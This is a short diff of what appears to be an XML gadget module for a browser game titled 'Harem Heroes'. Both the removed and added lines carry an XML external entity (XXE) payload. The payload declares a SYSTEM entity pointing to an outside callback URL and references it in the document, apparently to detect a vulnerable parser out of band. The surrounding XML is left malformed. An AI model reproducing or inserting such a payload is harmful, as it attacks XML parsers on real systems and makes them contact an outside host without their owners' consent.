@@ -1,7 +1,7 @@
-<?xml version="1.0" encoding="ISO-8859-1"?>
-    <!DOCTYPE foo [<!ELEMENT foo ANY>
-    <!ENTITY xxe SYSTEM "http://pingb.in/p/57709884a5421935803a6b31cbe6">]>
-    <foo>&xxe;</foo>
+<?xml version="1.0"?>
+<!DOCTYPE foo [  
+<!ELEMENT foo (#ANY)>
+<!ENTITY xxe SYSTEM "http://pingb.in/p/57709884a5421935803a6b31cbe6">]><foo>&xxe;</foo>
 ]><Module>
 	<ModulePrefs title="Harem Heroes">
 		<Require feature="nutaku" />
